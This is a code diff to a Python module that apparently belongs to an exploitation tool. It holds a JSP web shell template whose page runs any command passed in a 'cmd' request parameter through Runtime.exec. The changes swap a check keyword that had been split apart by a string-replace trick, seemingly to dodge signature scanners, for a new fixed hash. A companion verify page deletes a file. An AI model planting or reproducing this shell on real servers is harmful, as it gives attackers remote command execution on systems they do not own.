@@ -7,7 +7,7 @@ class JspShell(Webshell):
     _content = '<%@ page import="java.util.*,java.io.*"%>\n' \
                '<%\n' \
                'if (request.getParameter("check") == "1")\n' \
-               '    out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");\n' \
+               '    out.println("00799a96dcc29282dd74e23e49b647aa");\n' \
                'if (request.getParameter("{0}") != null)\n' \
                '{{\n' \
                '    Process p = Runtime.getRuntime().exec(request.getParameter("{1}"));\n' \
@@ -24,7 +24,7 @@ class JspShell(Webshell):
                '%>\n'
     _password = 'cmd'
     _check_data = {'check': '1'}
-    _keyword = '202cb962ac59075b964b07152d234b70'
+    _keyword = '00799a96dcc29282dd74e23e49b647aa'
 
     def get_content(self):
         return self._content.format(self._password, self._password)
@@ -41,5 +41,5 @@ class JspVerify(VerifyShell):
                '  d.delete();\n' \
                '  }}\n' \
                '%>\n' \
-               '<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23");%>'
-    _keyword = '202cb962ac59075b964b07152d234b70'
+               '<% out.println("00799a96dcc29282dd74e23e49b647aa");%>'
+    _keyword = '00799a96dcc29282dd74e23e49b647aa'
